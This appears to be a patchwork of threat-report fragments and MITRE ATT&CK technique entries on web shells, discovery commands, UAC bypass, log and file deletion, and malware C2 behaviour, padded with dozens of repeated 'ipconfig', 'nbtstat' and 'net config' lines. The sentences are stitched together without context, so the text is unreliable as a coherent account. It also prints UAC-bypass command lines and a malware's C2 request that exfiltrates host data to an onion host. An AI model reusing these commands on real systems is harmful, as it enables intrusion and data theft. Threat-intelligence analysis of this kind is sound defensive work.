In Figure 9, below, red indicates targeted IP addresses, malware, registrant information, and domains associated with the targeted attack campaign while blue indicates criminal attack IP addresses, malware used, registrant information, and domains:  Figure 9
(Source: Dell SecureWorks) As shown in Figure 10, the unpacked JavaScript code reveals an iframe pointing to an IP address that is hosting the exploit
(Source: Dell SecureWorks) Appendix D — Domain name parking example CTU researchers have observed TG-3390 parking domains by pointing their A record to a non-routable IP space, including the 127.0.0.[x] loopback address
The code will gather the information and format the list using the following HTML to create a table: <table> <tr><td>Type</td><td>Owner</td><td>Permissions</td><td>Created</td><td>Modificated</td><td>Size</td><td>Path</td></tr> <tr><td>[fileType]</td><td>[fileOwnerAccountName]</td><td>[number filePosixPermissions]</td><td>[fileCreationDate]</td><td>[fileModificationDate]</td><td>[fileSize]</td><td>[file path?]</td></tr> … </table>    Table 1 Commands available within XAgent OSX The ‘showBackupIosFolder’ command is rather interesting, as it allows the threat actors to determine if a compromised system was used to backup an IOS device, such as an iPhone or iPad
Trickbot uses this encrypted module to scan the network and steal relevant network information.
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
ipconfig 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 nbtstat 
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
 net config
Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )

Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. 
It is a preferred platform within data centers and the cloud for businesses, as well as an ongoing favorite when it comes to a majority of Internet-facing web and application servers
Furthermore, this group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY, and used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources
Attack Lifecycle  Initial Compromise APT40 has been observed leveraging a variety of techniques for initial compromise, including web server exploitation, phishing campaigns delivering publicly available and custom backdoors, and strategic web compromises
APT40 relies heavily on web shells for an initial foothold into an organization
Web shells are heavily relied on for nearly all stages of the attack lifecycle
Internal web servers are often not configured with the same security controls as public-facing counterparts, making them more vulnerable to exploitation by APT40 and similarly sophisticated groups
Maintain Presence APT40 primarily uses backdoors, including web shells, to maintain presence within a victim environment
APT40 strongly favors web shells for maintaining presence, especially publicly available tools
OwaAuth — This web shell and credential stealer deployed to Microsoft Exchange servers is installed as an ISAPI filter
(Source: SecureWorks)  China Chopper web shell — This web-based executable script communicates with a full-featured user interface to allow threat actors to transfer and create files, open a command terminal, and interact with database servers
(Source: SecureWorks) In multiple instances, CTU researchers observed artifacts from unsuccessful attempts to create a web shell on web-accessible JBOSS-based service desk software, followed by use of a functional shell to gain access to the environment
(Source: SecureWorks) Reentry attempt After BRONZE UNION was evicted from a compromised environment, which involved blocking the group's known infrastructure, CTU researchers observed the group attempting to reconnect to its OWA web shells and a backup web shell it had deployed during the intrusion
To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).Protect Against SQL Injection and Other Attacks on Web ServicesTo protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities
They should also take the following steps to harden both web applications and the servers hosting them to reduce the risk of network intrusion via this vector.Use and configure available firewalls to block attacks.Take steps to secure Windows systems, such as installing and configuring Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker.Monitor and remove any unauthorized code present in any www directories.Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.Remove unnecessary HTTP verbs from web servers
Typical web servers and applications only require GET, POST, and HEAD.Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.Secure both the operating system and the application.Update and patch production servers regularly.Disable potentially harmful SQL-stored procedure calls.Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.Consider using type-safe stored procedures and prepared statements.Audit transaction logs regularly for suspicious activity.Perform penetration testing on web services.Ensure error messages are generic and do not expose too much information.Permissions, Privileges, and Access ControlsSystem operators should take the following steps to limit permissions, privileges, and access controls.Reduce privileges to only those needed for a user’s duties.Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle of “Least Privilege” to all systems and services
Additionally, on that same url, http://mdzz2019.noip[.]cn:3654/ is used to distribute more versions of this Gh0stRAT sample, along with a .zip file containing ASPXSpy, a web shell
Audit ISAPI filters and search for web shells on Microsoft Exchange servers
ChinaChopper web shell
(Source: Dell SecureWorks) Passwords, like "admin-na-google123!@#" shown in Figure 4, are required to interact with the web shell
TG-3390 has used additional web shells containing similarly formatted passwords
However, the OwaAuth web shell password contains the victim organization's name
More information about the OwaAuth web shell is available in Appendix C
ASPXTool — A modified version of the ASPXSpy web shell (see Figure 6)
ASPXTool web shell
The OwaAuth web shell is likely created with a builder, given that the PE compile time of the binary does not change between instances and the configuration fields are padded to a specific size
The adversaries modify publicly available tools such as ASPXSpy to remove identifying characteristics that network defenders use to identify web shells
TG-3390 actors have deployed the OwaAuth web shell to Exchange servers, disguising it as an ISAPI filter
They then identify the Exchange server and attempt to install the OwaAuth web shell
If the OwaAuth web shell is ineffective because the victim uses two-factor authentication for webmail, the adversaries identify other externally accessible servers and deploy ChinaChopper web shells
(Source: Dell SecureWorks) To facilitate lateral movement, the adversaries deploy ASPXTool web shells to internally accessible systems running IIS
Mapping of TG-3390's interactions with web shells during an intrusion responded to by CTU researchers
OwaAuth web shell PDB string
Each web shell instance is configured to contain SP, Key, and Log variables
OwaAuth web shell command set
The stylecs.aspx webshell provides fairly significant functionality, as its developer wrote this webshell in JScript that ultimately runs any supplied JScript code provided to it within the HTTP request..
Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)

In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)
The majority of businesses still maintain Windows-heavy user environments where certain core infrastructure components also operate under Windows servers (e.g., Active Directory, SharePoint, etc.)
The MPK IRC Bot monitors active application windows and writes the title of the open window along with the logged keystrokes to a file at “%temp%\Save.tmp”
The MPK Trojan also monitors specifically for windows that are likely to contain login forms for popular web-based email clients, such as titles that contain: “Gmail -” “Yahoo – login” “Sign In -” “Outlook.com -“ MPK will attempt to parse these window titles to identify the associated email address and record these to the log file using the following format: ///////////// Mail Find <email address> /////////// If the Trojan does not find the window titles associated with Gmail, Yahoo or Outlook, it saves the title to the “Save.tmp” file in the following format: +++++++++++++ Window= <window title> +++++++++++++ The major difference between the IRC variant and non-IRC variant of MPK is the C2 protocol used
Because of Poseidon’s longevity, there are samples targeting Windows systems as early as Windows NT 4.0 Server and Windows 95 Workstation up to current versions like Windows 8.1, as well as server variants (very important to them, given the emphasis on reaching Domain Controllers in corporate environments.) How is this different from any other targeted attack? The extortion elements of this campaign are what set it apart from others
Offset Description   0x0 Victim GUID (8C8CEED9-4326-448B-919E-249EEC0238A3)   0x25 Victim IP Address (192.168.180.154)   0x45 Command (0x66660001)   0x49 Length of payload (0x2f – 47)   0x4d Field 1 – Windows major version (0x6 – Windows Vista+)   0x51 Field 2 – Windows minor version (0x1 – Windows 7)   0x55 Field 3 – Unknown (0x20)   0x59 Payload (default flag:4/2/2018 1:01:33 AM)    Table 5 – Beacon structure for PLAINTEE
Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.(Citation: Prevailion DarkWatchman 2021)
Linux malware detection and prevention is not prevalent at this time, but Palo Alto Networks customers are protected through our next-generation security platform:  IPS signature 14917 deployed to identify and prevent command and control activity The C2 domains and files mentioned in this report are blocked in our Threat Prevention product
Destroy Evidence: Securely deleted logs, as well as deployed and executed disk-wiping malware, to cover tracks and disrupt forensic analysis
The organization managed to discover what scripts were hosted on the server before BE/SandWorm gang deleted them, and unfortunately couldn’t restore them after they were deleted
For example, at the end of 2016 CTU researchers observed the threat actors using native system functionality to disable logging processes and delete logs within a network
After running within the %TEMP% path, Comnie will delete the original file
KEYS Deletes the file named by tempPath + “ky” file so as not to upload anything
LANS Deletes the file created by the LAN command to reverse the effect
USBS Deletes the file created by the USB command to reverse the effect
HDS Deletes the file created by the HD command to reverse the effect
DEL-TEMP Deletes all files in the “AppData/Local/Temp” path
Overwrite a file with all zeros and mark it for deletion on reboot  Wiping files with zeros and marking it for deletion on reboot.   Delete files using the DeleteFile() API Load an arbitrary library into its process space
The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration
Appendix Malware Family Descriptions    Malware Family  Description  Availability    DROPSHOT  Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware  Non-Public    NANOCORE  Publicly available remote access Trojan (RAT) available for purchase
DEL Deletes a specified file
The message sent to the C2 will be “file is deleted.” if successful or “file is not deleted.” if unsuccessful
Deletes existing file
The dropped executable (MD5: 78734CD268E5C9AB4184E1BBE21A6EB9) contains the compressed FELIXROOT dropper component in the Portable Executable (PE) binary overlay section
The dropper will delete itself at the end of the process
After this file is copied, the original ‘Update.~tmp’ file is deleted
In the event it does, Reaver will move this file to ‘%TEMP%\~FJIOW.tmp’ and delete this new file
boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the scheduled task whose name a GUID stored in the GID.bin file
Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task
After running the malware, the batch script goes on to cleans up all signs of its existence on the system, this includes:  Deletion of all initial files created during installation, as well as all associated files required on disk during initial execution
Kaspersky Lab products detect the malware used by Poseidon Group with the following detection names: Backdoor.Win32.Nhopro HEUR:Backdoor.Win32.Nhopro.gen HEUR:Hacktool.Win32.Nhopro.gen How many victims have you found? At least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms
This system configuration file (in.sys) will drop a backdoor installer (UserInstall.exe) then delete itself
Both “%APPDATA%\\Microsoft\Windows\Cookies.txt” and “%APPDATA%\\Microsoft\Windows\Cookies.exe” are then deleted
Once they are deleted by the attackers’ code, there is nothing left to be forensically recovered.
and then deletes the original launcher
Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.
Size Expansion of Configuration Information PlugX is designed to run based on its configuration information stored in itself
This version of the campaign made malicious use of unins000.exe, a process that belongs to the Brazilian information security company GAS Tecnologia, to gather personal information undetected
The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V., which is an autonomous system name we have previously seen associated with the OilRig group
OSinfo: OSInfo is a general purpose, system information gathering tool
This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities
The data above contains the hostname (‘HOSTNAME-PC’) of the victim machine, as well as an instruction
To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c The generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters
Once the second DLL is executed, it gathers information about the victim system’s setup, such as operating system version, and driver and processor information
System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors
One computer that was infected with both Cadelspy and Remexi was a system that ran a SIM card editing application
Cadelspy initially arrives on the computer as a dropper, which downloads two installer components catering to whether the victim is running a 32-bit or 64-bit system
Other functionalities provided by this section of the PowerShell Script are as follows:  Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name Username    All of this data is concatenated and formatted as shown in Figure 13:    Figure 13: Concatenated and formatted data retrieved by PowerShell script  Register the victim’s machine to the C2 server by sending the REGISTER command to the server
Freenki is used to gather information about the infected system and to download a subsequent stage payload
The information this malware collected included the following:The computer nameThe usernameThe execution path of the sampleThe BIOS modelA randomly-generated ID to uniquely identify the systemGroup123 utilized this method to ensure their victim was (a) someone they wanted to target further and (b) someone they could infect further based on the information obtained from the reconnaissance phase
You can see that in addition to the code, the author copy-pasted English typos such as "IE Registery":PDB PathsWe can clearly identify a pattern in the PDB naming convention of all the binaries mentioned in this article.ROKRAT:e:\Happy\Work\Source\version 12\T+M\Result\DocPrint.pdb (from the "Evil New Year" campaign)d:\HighSchool\version 13\2ndBD\T+M\T+M\Result\DocPrint.pdb (from the "North Korean Human Rights" campaignD:\HighSchool\version 13\First-Dragon(VS2015)\Sample\Release\DogCall.pdb (ROKRAT Sample from an unidentified campaign from June)Wiper:D:\HighSchool\version 13\VC2008(Version15)\T+M\T+M\TMProject\Release\ErasePartition.pdb (From the "Are You Happy?" campaign)Summary GraphHere is a graph to visualize the similarities and differences between each campaign mentioned in this article:ConclusionSouth Korea is becoming an important target for malicious actors and the techniques used are becoming specific to the region (for example: use of native language to try and ensure the targets feel that the information, document or email being sent to them has added legitimacy)
After connecting to the IRC server, the MPK bot sends custom ping messages and provides an introduction via a “!Hello” message that contains the current logged in user of the infected host, if the user has administrator privileges, the hostname, the UUID of the system, and operating system version
The malware queries the Windows API to get the computer name, user name, volume serial number, Windows version, processor architecture and two additional values, which are “1.3” and “KdfrJKN”
Parameter   Description    ‘u=’  This parameter contains target machine information in the following format: <Computer Name>, <User Name>, <Windows Versions>, <Processor Architecture>, <1.3>, < KdfrJKN >, <Volume Serial Number>    ‘&h=’  This parameter includes the information about the command executed and its results
The rest of MirageFox functions similarly to previous malware created by APT15, first collecting information about the computer like the username, CPU information, architecture, and so forth
infoClient is reponsible for collecting OS info, submitting this info to its C&C servers (the servers are malicious in nature), and receiving additional C&C communication information
The HandlePP::getClientID method uses the following environment variables:   Figure 11. Serial number   Figure 12. Hardware UUID   Figure 13. MAC address   Figure 14. Randomly generated UUID For the initial information packet, the backdoor also collects the following:   Figure 15. OS version Running getpwuid ->pw_name , scutil – -get ComputerName, and uname –m will provide the following returns respectively:  Mac OSX 10.12
As we can see, the following information is present within this configuration:  Remote Command and Control (C2) server Remote port Sleep timer  Reaver continues to collect various information from the victim machine, including the following:  CPU speed Computer name Username IP Address Microsoft Windows version Physical and virtual memory information  The malware proceeds to communicate with the remote server via HTTP GET and POST requests
Reaver continues to collect various information from the victim machine, including the following:  Computer name Volume serial number Microsoft Windows version CPU speed ANSI code page OEM code page identifier for the operating system Physical and virtual memory information  Reaver encrypts this data using an incremental XOR key and uploads it to the configured remote server on the port specified
Here is an example of the result of ps ax on an infected system:       $ ps ax[...] 566 ?? Ss 0:00.01 /usr/libexec/icloudsyncd -launchd netlogon.bundle[...]     Figure 8: Result of ps ax on an infected system Keychain stealing The OSX/Keydnap backdoor is equipped with a mechanism to gather and exfiltrate passwords and keys stored in OS X’s keychain
POST /api/osx/started HTTP/1.1Host: r2elajikcosf7zee.onion.toAccept: */*Content-Length: 233Content-Type: application/x-www-form-urlencodedbot_id=9a8965ba04e72909f36c8d16aa801794c6d905d045c2b704e8f0a9bbb97d3eb8&amp;data=psX0DKYB0u...5TximyY%2BQY%3D     Figure 10: Malware sending initial information       &gt; rc4decrypt(base64decode("psX0DKYB0u...5TximyY+QY="), "u2RLhh+!LGd9p8!ZtuKcN")device_model=MacBookPro9,2bot_version=1.3.5build_name=elitef*ckos_version=15.5.0ip_address=4.5.6.7has_root=0     Figure 11: Decoded data sent to C&C The bot_id is constructed by hashing the following values with SHA-256:  The hardware UUID (IOPlatformUUID) The system serial number (IOPlatformSerialNumber) The model identifier of the Mac (e.g.: MacBookPro9,2)  Most actions are self-explanatory
Additional information For more information about the attacks and the indicators of compromise, please contact: intelreports@kaspersky.com Alternatively, please visit: https://www.kaspersky.com/enterprise-security/apt-intelligence-reporting To find more information about cybersecurity awareness training for enterprise or government staff, go to Kaspersky Security Awareness
This information allows a threat actor to determine if their messages were delivered, which users are more susceptible to opening them, and basic information regarding the target’s operating system and e-mail client (or browser)
This phase will often leverage a specialized tool that automatically collects a wide array of information including credentials, group management policies, and even system logs to better hone further attacks and assure execution of their malware
A noteworthy addition to the Poseidon toolkit is the IGT supertool (Information Gathering toolkit), a bulking 15 megabyte executable that orchestrates a series of different information collections steps, exfiltration, and the cleanup of components
The main purpose of the IGT tool is to make an inventory of the system, saving information from the network interfaces and addresses, credentials belonging to the Domain and database server, services being run from the OS and everything that could help the Poseidon Group make its attack more customized to its victim
Is this a Windows-only threat? Which versions of Windows are targeted? Poseidon is particularly focused on the Microsoft Windows operating system family, specifically customizing the infection method for each one so as to gather different information and hide its presence after the initial infection
A multilayered approach is a must to securing the organization’s perimeter, especially for information security professionals and system/IT administrators
This variation of the Zebrocy downloader begins by gathering the serial number for the storage volume with the label “C:\” and the computer name
Two of them are MacOS X User-Agents and the third is a hashed string:  Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/BADDAD Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405   E9BC3BD76216AFA560BFB5ACAF5731A3   Figure 5: SpeakUp `s requests are encrypted with the salted base64 and include the unique User-Agent At the moment SpeakUp serves XMRig miners to its listening infected servers
Download & execute Startup (with persistence) Collection of system information (OS, version, installed location, etc.) Self-update Uninstall  This project was created by a user called zettabithf which is linked to a user with the same name in Hack Forums
Low confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources
URL parameter Sample data Description   c= Victim->Administrator Hostname and username   l= 192.168.1.100 Compromised system's IP address   o= 5,1,1,32 Windows major and minor version, coupled with architecture (32 v
The verb get can be used in a myriad of ways to retrieve information for a machine, however in this case os get /format: is being abused to download payloads from non-local resources with .xsl extensions
Revenge RAT is a simple and freely available Remote Access Trojan that automatically gathers system information before allowing threat actors to remotely access system components such as webcams, microphones, and various other utilities
itwm= ags= oe= aq= btnG= oprnd= itwm= utm= channel= The XAgent OSX Trojan generates a system specific value that it refers to as an “agent_id”, which is a unique identifier for each compromised host
The value is derived using the IOService to access the IOPlatformUUID property, which is equivalent to the “Hardware UUID” listed in the system information application, as seen in the Figure 3 screenshot of our analysis system
The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was “0000”
The payload sends system information about the infected computer to the C&C server and downloads additional tools.
If it is successful then it will send out basic host information and await further commands.
After decoding their C2 server IP addresses, from obfuscated strings, both trojans will attempt to collect host information and send it to the C2 server.
Operating system's name (i.e., the name of the machine) Operating system's OS architecture Operating system's caption Computer system's domain Computer system's username Computer's public IP address

Once successfully installed in a system, Trickbot will gather system information such as OS, CPU, and memory information, user accounts, lists of installed programs and services.
An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)

Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)
(To bypass UAC) configurable setting for the process to abuse  Other than these, new coding algorithm has been introduced
This request is followed by a call to “GetisrunasAbById” to determine if the Trojan should use “runas” to execute the downloaded executable with elevated privileges, which would display the UAC dialog for the user to click
The CAB file contains the following files and functions:  dll: A malicious DLL used to launch batch files (used with cliconfg.exe for UAC bypass)
The macro then extracts the CAB file into %systemroo%\system32, using either wusa.exe or expand.exe (depending on the OS) to again bypass UAC prompts Once the files have been extracted, the Visual Basic macro deletes the CAB file and runs the malicious NTWDBLIB.dll via cliconfg.exe (to gain privileges and bypass UAC protections) Command lines used by the Visual Basic macro:  cmd /c wusa %TEMP%\setup.cab /quiet /extract:%SystemRoot%\System32 && del /f /q %TEMP%\setup.cab && cliconfg.exe cmd /c expand %TEMP%\setup.cab -F:* %SystemRoot%\System32 && del /f /q %TEMP%\setup.cab && cliconfg.exe A combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows
The key differences in this variant:  Two CAB files are encoded into the Word document in text boxes instead of being appended in the DOC file There is one CAB file for an x86 system and another for an x64 system This malware sample uses uacme.exe with dummy.dll to implement the UAC bypass  exe is the program vulnerable to the UAC bypass attack dll runs install.bat to set up the service (same as NTWDBLIB.dll)   exe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS
Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)

Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)

Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)
Its encoding method has been modified from time to time, aligned with major upgrade of PlugX itself
The PE compile time of loaders and the create time of droppers (Word documents) are plotted in the graph
Campaign Code and Compile Time Correlation In some cases, there is a close proximity of the compile time of a CARBANAK sample to the month specified in a particular campaign code
These four were then all modified on the same date and time on October 13, 2018 08:21
A possible explanation for this is that the document was copied to another system with an incorrectly set system time, then saved with the incorrect time
Alarmingly, the detection score on VirusTotal for all of the documents continues to be 0/56 from the time the first documents were uploaded (1.6.2017) up until the date of this publication
This is the first time that Bankshot has been tied directly to financial-related hacking and the first time it has been used since November 2017
The times of day that APT33 threat actors were active suggests that they were operating in a time zone close to 04:30 hours ahead of Coordinated Universal Time (UTC)
The time of the observed attacker activity coincides with Iran’s Daylight Time, which is +0430 UTC
Cadelle and Chafer are most active during the day time within Iran’s time zone and primarily operate during Iran’s business week (Saturday through Thursday)
When the backdoor establishes a connection to the command and control server, it sets the request period time equal to the specified dwell time for the standby mode
If the dwell time value for the active mode has been set, but the package has not been received, the dwell time value is incremented by the dwell time value for the active period
This action is repeated until the dwell time value is bigger or equal to the dwell time value for the standby mode
Timezone Check The Trojan check to see if the system is configured (“DaylightName”) with one of the following time zones:   Arabic Daylight Time (UTC+3) Arab Daylight Time (UTC+3) Arabian Daylight Time (UTC+4) Middle East Daylight Time (UTC+2) Iran Daylight Time (UTC+3.5)   Human Interaction Check Before executing its functional code, the Trojan presents a dialog box with the following line of code:   Interaction.MsgBox(encodedStringClass.return_user32_bogus_errorcode_(3), MsgBoxStyle.Critical, null);   This dialog box displays  An error occurred while processing user32.dll!, which the user must click the ok button for the Trojan to run its functional code
The last technique that was particularly interesting is the time zone check, as the Trojan will not execute its functional code if the system does not have a specific time zone set
Figure 3 Countries in which OopsIE will run in based on the time zone Notable Differences The OopsIE Trojan delivered in this attack had functional code that was very similar to the OopsIE variant discussed in our previous blog
In another case the attackers use another code snippet borrowed from the SubTee GitHub project, this time filling in a fully templated .NET application whitelist bypass file: SHA256: 3e9136f95fa55852993cd15b82fe6ec54f78f34584f7689b512a46f0a22907f2: This time the attacker didn’t have to write any of their own code, instead they were simply able to paste their shellcode directly into a template, in order to launch PlugX as a child process of a trusted application
Watches uninstall time, checks time diff (local time vs internet time)
An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)

System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service)

This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)
Here’s a python code to decode
The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT
Figure 2: Exploit Shellcode used to Locate and Decode Payload The shellcode (Figure 2) searches for and decodes the executable payload contained in memory between the beginning and ending file markers 0xBABABABA and 0xBBBBBBBB, respectively
This function is able to obfuscate code so that every iteration of the code is presented differently
It then downloads and decrypts a PNG file
The state command sets a global variable containing a series of Boolean values represented as ASCII values ‘0’ or ‘1’ and also adds itself to the configuration file
The code comparison specifically shows the HighShell code including a salt variable containing di2zag7wZHTK9YR0NGq, which is not present within the TwoFace code on the left
Comnie continues to load an embedded bitmap (BMP) file and decrypt data at offset 0x512
Figure 11 Embedded BMP file containing encrypted string data RC4 is used to decrypt this data using a 16-byte key that is stored within the BMP file at offset 0x502
Once decrypted, we are provided with a large list of strings, as seen below (note that the data has been truncated for brevity):  Figure 12 Decrypted strings from embedded BMP file After these strings are decrypted, the malware will load a series of Microsoft Windows API calls to be used later on
